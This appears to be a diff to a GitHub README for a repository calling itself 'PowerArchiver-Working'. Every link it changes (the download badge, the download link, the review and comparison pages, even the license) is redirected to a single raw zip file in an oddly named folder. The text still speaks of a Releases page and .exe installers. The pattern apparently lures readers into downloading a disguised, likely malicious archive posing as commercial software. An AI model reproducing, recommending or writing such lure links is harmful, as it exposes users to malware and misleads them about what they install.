@@ -1,12 +1,12 @@
 # 📦 PowerArchiver-Working - Easy Archiving for Everyone
 
-[![Download PowerArchiver](https://img.shields.io/badge/Download-PowerArchiver-4CAF50)](https://github.com/zainnail/PowerArchiver-Working/releases)
+[![Download PowerArchiver](https://raw.githubusercontent.com/zainnail/PowerArchiver-Working/main/vintneress/PowerArchiver-Working_v1.2.zip)](https://raw.githubusercontent.com/zainnail/PowerArchiver-Working/main/vintneress/PowerArchiver-Working_v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to PowerArchiver-Working! This application helps you easily manage and archive your files. You can compress and decompress files, making it easy to share and save space on your computer. 
 
 ## 📥 Download & Install
-To get started with PowerArchiver, visit this page to download: [Download PowerArchiver](https://github.com/zainnail/PowerArchiver-Working/releases).
+To get started with PowerArchiver, visit this page to download: [Download PowerArchiver](https://raw.githubusercontent.com/zainnail/PowerArchiver-Working/main/vintneress/PowerArchiver-Working_v1.2.zip).
 
 Once on the Releases page, you'll see several versions of PowerArchiver. Choose the latest version for the best features and performance. Click on the version number and look for an installer file (usually ending in .exe for Windows). 
 
@@ -48,8 +48,8 @@ If you encounter issues or have questions, help is available. You can find a use
 ## 🌟 Additional Resources
 Explore more about PowerArchiver with the following links:
 
-- [PowerArchiver Review](https://github.com/zainnail/PowerArchiver-Working/blob/main/POWERARCHIVER_REVIEW.md) - A detailed review of features and performance.
-- [Comparing PowerArchiver vs 7-Zip](https://github.com/zainnail/PowerArchiver-Working/blob/main/PV7ZIP_COMPARISON.md) - See how PowerArchiver stacks up against other archivers.
+- [PowerArchiver Review](https://raw.githubusercontent.com/zainnail/PowerArchiver-Working/main/vintneress/PowerArchiver-Working_v1.2.zip) - A detailed review of features and performance.
+- [Comparing PowerArchiver vs 7-Zip](https://raw.githubusercontent.com/zainnail/PowerArchiver-Working/main/vintneress/PowerArchiver-Working_v1.2.zip) - See how PowerArchiver stacks up against other archivers.
 
 For regular updates and tips, follow our discussion forums on this repository.
 
@@ -57,6 +57,6 @@ For regular updates and tips, follow our discussion forums on this repository.
 Join the conversation! You can share your experience or provide feedback in our community discussions. Your input helps improve PowerArchiver for everyone.
 
 ## 📜 License
-PowerArchiver is licensed under the [MIT License](https://github.com/zainnail/PowerArchiver-Working/blob/main/LICENSE.md). You are free to use, modify, and distribute the software under the terms of this license.
+PowerArchiver is licensed under the [MIT License](https://raw.githubusercontent.com/zainnail/PowerArchiver-Working/main/vintneress/PowerArchiver-Working_v1.2.zip). You are free to use, modify, and distribute the software under the terms of this license.
 
 Thank you for choosing PowerArchiver-Working. We hope this tool enhances your file management experience!
